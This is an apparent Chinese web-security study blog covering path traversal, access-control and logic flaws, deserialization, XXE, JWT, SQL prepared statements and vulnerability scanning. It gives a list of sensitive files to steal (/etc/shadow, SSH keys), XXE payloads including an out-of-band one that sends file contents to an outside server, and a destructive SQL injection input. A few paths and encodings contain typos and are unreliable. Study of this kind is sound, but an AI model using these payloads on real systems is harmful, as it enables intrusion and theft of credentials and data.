<h3 id="文件下载的作用"><a href="#文件下载的作用" class="headerlink" title="文件下载的作用"></a>文件下载的作用</h3><p>下载文件，存在文件下载功能的点皆有可能存在文件下载漏洞</p>
<p><strong>下载数据库配置文件（敏感文件）</strong></p>
<ul>
<li>扫描工具爬行或者扫描地址</li>
<li>通过下载好的文件代码分析路径（可见文件）和包含文件获取</li>
</ul>
<p>直接访问和下载文件的请求方式不同：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">download.php?<span class="hljs-attribute">filename</span>=1.jpg<br>download.php?<span class="hljs-attribute">filename</span>=../download.php<br></code></pre></td></tr></table></figure>



<h3 id="如何判断文件下载漏洞"><a href="#如何判断文件下载漏洞" class="headerlink" title="如何判断文件下载漏洞"></a>如何判断文件下载漏洞</h3><ul>
<li>首先观察存在文件下载功能点的地方</li>
<li>对存下载功能点的地方进行测试：download&#x2F;index.php</li>
<li>若文件被解析，则是存在文件包含漏洞</li>
<li>若显示源代码，则是文件读取漏洞</li>
<li>若提示文件下载，则是文件下载漏洞，在存在文件下载功能的地方均可能存在下载漏洞</li>
</ul>
<h3 id="在linux和Windows中的下载路径"><a href="#在linux和Windows中的下载路径" class="headerlink" title="在linux和Windows中的下载路径"></a>在linux和Windows中的下载路径</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs dts">下载文件：数据库、平台……配置文件<br>Windows<br><span class="hljs-symbol">C:</span>\boot.ini <span class="hljs-comment">//查看系统版本</span><br><span class="hljs-symbol">C:</span>\Windows\System32\inetsrv\MetaBase.xml <span class="hljs-comment">//IIS 配置文件</span><br><span class="hljs-symbol">C:</span>\Windows\repair\sam <span class="hljs-comment">//存储系统初次安装的密码</span><br><span class="hljs-symbol">C:</span>\Program Files\mysql\my.ini <span class="hljs-comment">//Mysql 配置</span><br><span class="hljs-symbol">C:</span>\Program Files\mysql\data\mysql\user.MYD <span class="hljs-comment">//Mysql root</span><br><span class="hljs-symbol">C:</span>\Windows\php.ini <span class="hljs-comment">//php 配置信息</span><br><span class="hljs-symbol">C:</span>\Windows\my.ini <span class="hljs-comment">//Mysql 配置信息</span><br><span class="hljs-symbol">C:</span>\Windows\win.ini <span class="hljs-comment">//Windows 系统的一个基本系统配置文件</span><br><br><br>Linux<br><span class="hljs-keyword">/root/</span>.ssh/authorized_keys<br><span class="hljs-keyword">/root/</span>.ssh/id_rsa<br><span class="hljs-keyword">/root/</span>.ssh/id_ras.keystore<br><span class="hljs-keyword">/root/</span>.ssh/known_hosts <span class="hljs-comment">//记录每个访问计算机用户的公钥</span><br><span class="hljs-keyword">/etc/</span>passwd<br><span class="hljs-keyword">/etc/</span>shadow<br><span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/app/</span>php5<span class="hljs-keyword">/lib/</span>php.ini <span class="hljs-comment">//PHP 配置文件</span><br><span class="hljs-keyword">/etc/</span>my.cnf <span class="hljs-comment">//mysql 配置文件</span><br><span class="hljs-keyword">/etc/</span>httpd<span class="hljs-keyword">/conf/</span>httpd.conf <span class="hljs-comment">//apache 配置文件</span><br><span class="hljs-keyword">/root/</span>.bash_history <span class="hljs-comment">//用户历史命令记录文件</span><br><span class="hljs-keyword">/root/</span>.mysql_history <span class="hljs-comment">//mysql 历史命令记录文件</span><br><span class="hljs-keyword">/proc/</span>mounts <span class="hljs-comment">//记录系统挂载设备</span><br><span class="hljs-keyword">/porc/</span>config.gz <span class="hljs-comment">//内核配置文件</span><br><span class="hljs-keyword">/var/</span>lib<span class="hljs-keyword">/mlocate/</span>mlocate.db <span class="hljs-comment">//全文件路径</span><br><span class="hljs-keyword">/porc/</span>self/cmdline <span class="hljs-comment">//当前进程的 cmdline 参数</span><br></code></pre></td></tr></table></figure>



<h2 id="越权：水平越权-amp-垂直越权"><a href="#越权：水平越权-amp-垂直越权" class="headerlink" title="越权：水平越权&amp;垂直越权"></a>越权：水平越权&amp;垂直越权</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">越权产生原因：<br>通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果验证权限不足，便会导致越权。常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，最后导致越权。<br><br>水平越权：通过更换某个ID之类的身份标识，从而使<span class="hljs-selector-tag">A</span>账号获取修改<span class="hljs-selector-tag">B</span>账号数据；<br>垂直越权：使用低权限身份的账号，发送高权限账号才能有的请求，获取其更高权限的操作；通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作<br></code></pre></td></tr></table></figure>



<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>当进行个人信息查看时可以通过抓包对用户名或者其他信息进行修改，从而达到水平越权获得其他用户的信息。</p>
<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>在登陆admin(较高一级的管理员)的情况下，对admin用户操作进行抓包。当登陆低一级的用户时，可以将高一级的用户的数据包掉出来，对其数据包中的cookiePHPSESSID的值。</p>
<p><strong>条件</strong></p>
<ul>
<li>需要有admin的数据包：<ul>
<li>普通用户可以在有操作的前端页面进行抓包</li>
<li>盲猜</li>
<li>通过搭建网站源码自己获取</li>
</ul>
</li>
</ul>
<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p><img src="/img/14.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="订单系统："><a href="#订单系统：" class="headerlink" title="订单系统："></a>订单系统：</h3><ul>
<li>通过抓包，修改相关值（ID、price、num、statu等），可以将数量值更改为-1达到逻辑错误，或者是，先抓取订单编号为10元的数据包，然后购买加个1000元的东西时，将数据包得订单编号更改为10元的，然后只需支付10元</li>
<li>或者抓包修改相关商品的信息，id值和name值。</li>
<li>修改支付状态：找回重置机制：客户端回显，response状态值，验证码爆破（验证码次数，时间），找回流程绕过等接口调用乱用：短信轰炸，来电轰炸</li>
</ul>
<h3 id="验证码安全："><a href="#验证码安全：" class="headerlink" title="验证码安全："></a>验证码安全：</h3><p>分类：图片、手机、邮箱、语音、视频、操作等</p>
<p>原理：验证生成或炎症过程中的逻辑问题</p>
<p>危害：账户权限泄漏、短信轰炸、遍历、任意用户操作等</p>
<p>漏洞：客户端回显、验证码复用、验证码爆破、绕过等</p>
<ul>
<li>正常情况下，手机验证是第一个页面输入手机号，第二个页面重置密码。但是会存在手机验证和重置密码在同一页的情况。</li>
<li>在这种情况下可以通过能获得验证码的手机获取验证码再通过抓包更改成想要攻击的手机号，从而进行攻击行为</li>
</ul>
<p>Token(爆破、回显、固定)， 回显在浏览器前端可以看见，固定就是可以多次重复使用</p>
<p>验证码（爆破、识别、复用、回显、绕过）Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码</p>
<p><strong>可以把页面回显中的Token值替换爆破中的Token值就可以绕过Token</strong></p>
<h2 id="反序列化之PHP-amp-JAVA"><a href="#反序列化之PHP-amp-JAVA" class="headerlink" title="反序列化之PHP&amp;JAVA"></a>反序列化之PHP&amp;JAVA</h2><p><strong>序列化和反序列化：</strong></p>
<p>序列化：将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。</p>
<p>反序列化：从存储区中读取该数据，并将其还原为对象的过程，称为反序列化。</p>
<h3 id="PHP反序列化："><a href="#PHP反序列化：" class="headerlink" title="PHP反序列化："></a>PHP反序列化：</h3><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、SQL注入、目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术 方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p>
<p><strong>php序列化与反序列化的关键函数：</strong></p>
<ul>
<li>serialize() 将一个对象转换成字符串</li>
<li>unserialize() 将字符串还原成一个对象</li>
</ul>
<p><strong>序列化后内容格式：object&#x3D;对象</strong></p>
<p><code>O(O代表object i代表数组):4(对象长度):&quot;test&quot;(对象名称):2(对象中变量个数):&#123;s(变量数据类型):4:&quot;name&quot;;i:2:&quot;19&quot;;&#125;</code></p>
<p><strong>反序列化中的魔术方法：</strong></p>
<p>简要的理解是当代码运行中触发了某条件，对应的魔术方法就会被执行。</p>
<h3 id="Java反序列化："><a href="#Java反序列化：" class="headerlink" title="Java反序列化："></a>Java反序列化：</h3><p><strong>Java中的API实现：</strong></p>
<ul>
<li>存在位置：Java.io.ObjectOutputStream java.io.ObjectInputStream</li>
<li>序列化：ObjectOutputStream类–&gt;writeObject()  — 该方法对参数指定的obj对象进行序列化，把字节序列写到哟个目标输出流中，按Java 的标准约定是给文件一个.ser扩展名</li>
<li>反序列化：ObjectInputStream类–&gt;readIObject()  —该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</li>
</ul>
<h2 id="XXE-amp-XML之利用检测绕过"><a href="#XXE-amp-XML之利用检测绕过" class="headerlink" title="XXE&amp;XML之利用检测绕过"></a>XXE&amp;XML之利用检测绕过</h2><p><img src="/img/15.png" srcset="/img/loading.gif" lazyload></p>
<p>XML被设计为数据和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据传输工具。XXE漏洞全称XML External Entity Injection， 即xml外部实体注入漏洞，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
<p><strong>XML与HTML的主要差异：</strong></p>
<ul>
<li>XML被设计为传输和存储数据，其焦点是数据的内容。</li>
<li>HTML被设计用来显示数据，其焦点是数据的外观。</li>
<li>HTML旨在显示信息，而XML旨在传输信息</li>
</ul>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs llvm">通用的XXE利用写法:<br>读文件:<br>&lt;?xml version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span>&gt;<br>&lt;<span class="hljs-title">!DOCTYPE</span> ANY[<br>	&lt;<span class="hljs-title">!ENTITY</span> xxe SYSTEM <span class="hljs-string">&quot;file:///test.txt&quot;</span>&gt; #在file后面是读取文件的路径<br>]&gt;<br>&lt;<span class="hljs-keyword">x</span>&gt;&amp;xxe<span class="hljs-comment">;&lt;/x&gt;</span><br><br>内网探针:<br>&lt;?xml version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span>&gt;<br>&lt;<span class="hljs-title">!DOCTYPE</span> foo[<br>	&lt;<span class="hljs-title">!ELEMENT</span> foo ANY &gt;<br>	 &lt;<span class="hljs-title">!ENTITY</span> rabbit SYSTEM <span class="hljs-string">&quot;http://192.168.0.1:8080/index.php&quot;</span>&gt;<br>]&gt;<br>&lt;<span class="hljs-keyword">x</span>&gt;&amp;rabbit<span class="hljs-comment">;&lt;/x&gt;</span><br><br>引入外部实体dtd - 前提没有禁止引用外部实体（可以自定攻击）:<br>&lt;?xml version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span>&gt;<br>&lt;<span class="hljs-title">!DOCTYPE</span> test[<br>	 &lt;<span class="hljs-title">!ENTITY</span> <span class="hljs-variable">%file</span> SYSTEM <span class="hljs-string">&quot;http://127.0.0.1:8080/test.dtd&quot;</span>&gt; #url指向自己的公网IP<br>	 <span class="hljs-variable">%file</span><span class="hljs-comment">;</span><br>]&gt;<br>&lt;<span class="hljs-keyword">x</span>&gt;&amp;send<span class="hljs-comment">;&lt;/x&gt;</span><br><br>dtd文件会被当作xml文件执行<br>所以在自己服务器上写上相应的代码即可<br>test.dtd: &lt;<span class="hljs-title">!ENTITY</span> send SYSTEM <span class="hljs-string">&quot;file:///test.txt&quot;</span>&gt;<br><br>无回显-读取文件有时网站代码中设置了不回显，可以通过向自己服务器发送数据来查看到信息，一种是看日志信息，一种是将传递进来的数据直接写入到文件中:<br>&lt;?xml version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span>&gt;<br>&lt;<span class="hljs-title">!DOCTYPE</span> test[<br>	 &lt;<span class="hljs-title">!ENTITY</span> <span class="hljs-variable">%file</span> SYSTEM <span class="hljs-string">&quot;php://filter/read=convert.base63-encode/resource=test.txt&quot;</span>&gt;<br>	 &lt;<span class="hljs-title">!ENTITY</span> <span class="hljs-variable">%dtd</span> SYSTEM <span class="hljs-string">&quot;http://192.168.0.1:8080/test.dtd&quot;</span>&gt;<br>	 <span class="hljs-variable">%dtd</span><span class="hljs-comment">;</span><br>	 <span class="hljs-variable">%file</span><span class="hljs-comment">;</span><br>]&gt;<br><br>在服务器中的test.dtd文件:<br>&lt;<span class="hljs-title">!ENTITY</span> <span class="hljs-variable">%payload</span><br>	<span class="hljs-string">&quot;&lt;!ENTITY &amp;#25; send SYSTEM</span><br><span class="hljs-string">	&#x27;http://192.168.0.1:8080/?data=%file;&#x27;&gt;&quot;</span><br>&gt;<br>&amp;payload<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>





<h1 id="三、JAVA安全"><a href="#三、JAVA安全" class="headerlink" title="三、JAVA安全"></a>三、JAVA安全</h1><p><img src="/img/16.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>JWT（Json Web Token）是为了在网络应用环境间<strong>传递声明</strong>而执行的一种基于JSON的开放标准。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<h4 id="jwt工作流程："><a href="#jwt工作流程：" class="headerlink" title="jwt工作流程："></a>jwt工作流程：</h4><p><img src="/img/17.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>用户端登录，用户名和密码在请求中被发往服务器</li>
<li>确认登录信息正确后，服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时， 服务器并没有保存登录状态信息。</li>
<li>服务器将 JWT（通过响应）返回给客户端</li>
<li>用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中</li>
<li>服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态、服务器返回响应</li>
</ul>
<h4 id="JWT与session区别："><a href="#JWT与session区别：" class="headerlink" title="JWT与session区别："></a>JWT与session<strong>区别</strong>：</h4><p>两者的主要目的都是存储用户信息，但是session将用户信息存储再服务器端，而JWT则是在客户端。JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</p>
<h4 id="JWT格式："><a href="#JWT格式：" class="headerlink" title="JWT格式："></a>JWT格式：</h4><p><code>header.payload.signature</code></p>
<p><strong>HEADER</strong></p>
<p>头部包含两个部分ALGORITHM &amp; TOKEN TYPE</p>
<ul>
<li><p>alg 说明这个JWT的签名使用的算法的参数，常见值用HS256（默认），HS512等，也可以为None。HS256 表示 HMAC SHA256。</p>
</li>
<li><p>typ 说明这个 token 的类型，此例中为 JWT</p>
</li>
</ul>
<p><strong>payload</strong></p>
<p>载荷就是存放有效信息的地方。这些有效信息包含三个部分</p>
<ul>
<li>标准中注册的声明</li>
<li>公共的声明</li>
<li>私有的声明</li>
</ul>
<p><strong>标准中注册的声明</strong> (建议但不强制使用) ：</p>
<p><strong>iss</strong>: jwt签发者</p>
<p><strong>sub</strong>: jwt所面向的用户</p>
<p><strong>aud</strong>: 接收jwt的一方</p>
<p><strong>exp</strong>: jwt的过期时间，这个过期时间必须要大于签发时间</p>
<p><strong>nbf</strong>: 定义在什么时间之前，该jwt都是不可用的.</p>
<p><strong>iat</strong>: jwt的签发时间</p>
<p><strong>jti</strong>: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</p>
<p><strong>signature</strong></p>
<p>签证信息由三部分组成：</p>
<ul>
<li>header (base64UrlEncode后)</li>
<li>payload (base64UrlEncode后)</li>
<li>secret</li>
</ul>
<p><strong>Base64URL编码</strong></p>
<p>在HTTP传输过程中，Base64编码中的”&#x3D;”,”+”,”&#x2F;“等特殊符号通过URL解码通常容易产生歧义，因此产生了与URL兼容的Base64URL编码在Base64URL编码中，”+”会变成”-“，”&#x2F;“会变成”_”，”&#x3D;”会被去掉，以此达到url safe的目的</p>
<p><strong>Refresh token</strong></p>
<p>JWT使用refresh token去刷新access token而无需再次身份验证。 refresh token的存活时间较长而access token的存活时间较短。</p>
<p>服务器中可能存在：未校验access token和refresh token是否属于同一个用户，导致A用户可使用自己的refresh token去刷新B用户的access token</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>.对JWT，signature <span class="hljs-keyword">key</span>爆破和篡改JWT的写法需要根据源码来相应设置。<br><span class="hljs-number">2</span>.对JWT，signature <span class="hljs-keyword">key</span>爆破可尝试直接明文和base64encode两种（不排除其他种可能）；有些情况下，对明文<span class="hljs-keyword">key</span>进行base64decode后作为signature <span class="hljs-keyword">key</span>来签名，这种情况非常少见。<br><span class="hljs-number">3</span>.refresh_token越权篡改他人access_token问题值得注意，refresh_token出现频率低，测试人员漏测几率高。<br><span class="hljs-number">4</span>.可在JWT的headers，payload部分的参数值中插入常见漏洞相关payload去尝试，尽管我们不知道signature <span class="hljs-keyword">key</span>。<br></code></pre></td></tr></table></figure>



<h3 id="Java安全处理-sql预编译"><a href="#Java安全处理-sql预编译" class="headerlink" title="Java安全处理-sql预编译"></a>Java安全处理-sql预编译</h3><p><strong>sql注入产生的原因</strong>：未经检查或者未经充分检查的<strong>用户输入数据</strong>，<strong>意外变成了代码被执行</strong>。SQL注入的<strong>本质</strong>就是利用SQL拼接存在的缺陷进行攻击。</p>
<h4 id="sql预编译原理"><a href="#sql预编译原理" class="headerlink" title="sql预编译原理"></a>sql预编译原理</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">当使用sql拼接：`&quot;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27; &quot; + username + &quot; &#x27;</span> <span class="hljs-string">&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">页面上可能会有个输入框：</span><br><span class="hljs-string"></span><br><span class="hljs-string">用户名:________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">如果有人这么填：</span><br><span class="hljs-string"></span><br><span class="hljs-string">用户名:___hello&#x27;; delete from user where id=&#x27;1__</span><br><span class="hljs-string"></span><br><span class="hljs-string">最终的Sql就是 &quot;</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;hello&#x27;</span>; <span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-string">&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sql注入就发生了，不仅仅会返回你想要的用户信息，还会删除id为1的用户；与代码预期的逻辑不一致。</span><br><span class="hljs-string"></span><br><span class="hljs-string">使用prepareStatement</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sql发送到服务器大致会有如下流程：</span><br><span class="hljs-string"></span><br><span class="hljs-string">解析阶段 - 编译阶段 - 优化阶段 - 缓存阶段 - 执行阶段</span><br><span class="hljs-string"></span><br><span class="hljs-string">在JDBC编程中，PreparedStatement 用于执行参数化查询。</span><br><span class="hljs-string"></span><br><span class="hljs-string">PrepareStatement发送到服务器后会经历上述1、2、3、4过程，PrepareStatement并不是完整的sql语句，在执行之前还需要进行用户数据替换。用户的数据只能作为数据进行填充，而不是sql的一部分。避免了sql注入。</span><br><span class="hljs-string"></span><br><span class="hljs-string">PreparedStatement 对象所执行的 SQL 语句中，参数用问号?来表示，调用PreparedStatement 对象的set方法来设置这些参数。set方法有两个参数，第一个参数是要设置的 SQL 语句中的参数的索引(从1开始)，第二个是设置的 SQL 语句中的参数的值。</span><br><span class="hljs-string"></span><br><span class="hljs-string">在对PreparedStatement进行预编译时，命令会带着占位符被数据库进行编译，并放到命令缓冲区。然后，每当执行同一个PreparedStatement语句的时候，由于在缓冲区中可以发现预编译的命令，虽然会被再解析一次，但不会被再次编译。</span><br><span class="hljs-string"></span><br><span class="hljs-string">编译过程识别了关键字、执行逻辑之类的东西，编译结束了这条SQL语句能干什么就确定了。编译之后通过set设置的部分，无法再改变执行逻辑，这部分就只能是相当于输入字符串被处理。</span><br><span class="hljs-string"></span><br><span class="hljs-string">Connection conn = DBconnect.getConnection();</span><br><span class="hljs-string">PreparedStatement ps=Null;</span><br><span class="hljs-string">Resultset rs=Null;</span><br><span class="hljs-string"></span><br><span class="hljs-string">String sql=&quot;</span><span class="hljs-keyword">Select</span> passwd <span class="hljs-keyword">FROM</span> test_table <span class="hljs-keyword">WHERE</span> username = ?<span class="hljs-string">&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">//预处理编译以后sql功能已经确定，?全部当作参数，不会被解析为命令</span><br><span class="hljs-string">ps = conn.prepareStatement(sql);</span><br><span class="hljs-string"></span><br><span class="hljs-string">//通过setString()指明参数是字符串</span><br><span class="hljs-string">ps.setString(1,new String(&quot;</span>admin<span class="hljs-string">&quot;));</span><br><span class="hljs-string"></span><br><span class="hljs-string">//执行查询</span><br><span class="hljs-string">rs = ps.exeuteQuery();</span><br></code></pre></td></tr></table></figure>



<p><strong>预处理无法参数化的地方</strong></p>
<p>典型的就是order by后的参数无法用占位符代替。</p>
<p>order by后一般是接字段名，而字段名是不能带引号的，比如 order by username；如果带上引号成了order by ‘username’，那username就是一个字符串不是字段名了，这就产生了语法错误。</p>
<p>本质上来说：凡是字符串但又不能加引号的位置都不能参数化；包括sql关键字、库名、表名、字段名、函数名等等。</p>
<p>order by后常常接字段名。</p>
<p>同理，<strong>like</strong>后也无法使用占位符代替</p>
<h1 id="四、漏洞发现"><a href="#四、漏洞发现" class="headerlink" title="四、漏洞发现"></a>四、漏洞发现</h1><h3 id="系统漏洞发现"><a href="#系统漏洞发现" class="headerlink" title="系统漏洞发现"></a>系统漏洞发现</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#漏洞发现-操作系统之漏洞探针类型利用修复</span><br><span class="hljs-section">角色扮演:操作系统权限的获取会造成服务器上的安全问题</span><br><span class="hljs-section">漏扫工具:Goby , Nmap , Nessus , Openvas , Nexpose等</span><br><span class="hljs-section">漏洞类型:权限提升、缓冲器溢出、远程代码执行、未知Bug等</span><br><span class="hljs-section">漏洞利用:工具框集成类、漏洞平台公布库类、漏洞复现文章参考等</span><br><span class="hljs-section">漏洞修复:打上漏洞补丁、关闭对应入门点、加入防护软件</span><br></code></pre></td></tr></table></figure>



<h4 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h4><p><strong>Goby：</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">goby下载：https:<span class="hljs-regexp">//</span>cn.gobies.org/<br>goby的官方文档：https:<span class="hljs-regexp">//</span>cn.gobies.org/docs.html<br><br>使用<br>goby的使用比较友好，在点击右上角的+号，输入IP或者域名，选择需要扫描的端口和需要验证的POC即可开始扫描<br><br>插件<br>goby内置了许多的插件，在goby的插件中心可以下载这边插件并使用，下载的时候需要挂代理，不然可能无法加载出来。<br><br>POC<br>goby支持导入poc，在goby程序目录下的\golib\exploits\user，可以将自己定义的后缀为.json的文件导入此文件夹<br></code></pre></td></tr></table></figure>

<p><strong>Nessus：</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>

<p><strong>Nmap：</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>



<h4 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h4><p><strong>工具框架：</strong></p>
<ul>
<li>Metasploit<ul>
<li>输入msfconsole进入界面</li>
<li>use到漏洞的name</li>
<li>show options显示配置详情</li>
<li>set rhost 需要攻击的主机IP，设置目标ip</li>
<li>最后输入exploit开始执行</li>
</ul>
</li>
<li>Searchsploit - 搜索bug下载链接：<a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></li>
<li>企业单位内部产品</li>
</ul>
<p><strong>单点EXP：</strong></p>
<ul>
<li>cnvd</li>
<li>seebug</li>
<li>1337day</li>
<li>Exploit-db</li>
<li>Packetstorm Security</li>
</ul>
<p><strong>复现文章：</strong></p>
<p>查找各种资讯来源</p>
<h3 id="WEB应用漏洞发现"><a href="#WEB应用漏洞发现" class="headerlink" title="WEB应用漏洞发现"></a>WEB应用漏洞发现</h3><h4 id="已知CMS："><a href="#已知CMS：" class="headerlink" title="已知CMS："></a>已知CMS：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">例如常见的dedecms,discuz,wordpress等源码结构，这类一般采用非框架类开发，但也有少部分采用的是框架类开发，针对于此类源码程序的安全检测，首先要利用已知的公开漏洞进行测试，如果不存在则对其进行白盒代码审计自行挖掘<br></code></pre></td></tr></table></figure>



<p><strong>漏洞平台：</strong></p>
<ul>
<li>cnvd</li>
<li>seebug</li>
<li>1337day</li>
<li>Exploit-db</li>
<li>Packetstorm Security</li>
</ul>
<p><strong>工具框架：</strong></p>
<ul>
<li>cmsscan</li>
<li>wpscan</li>
<li>joomscan</li>
<li>Drupauscan</li>
</ul>
<p><strong>代码审计：</strong></p>
<ul>
<li>函数点挖掘</li>
<li>功能点挖掘</li>
<li>框架类挖掘</li>
</ul>
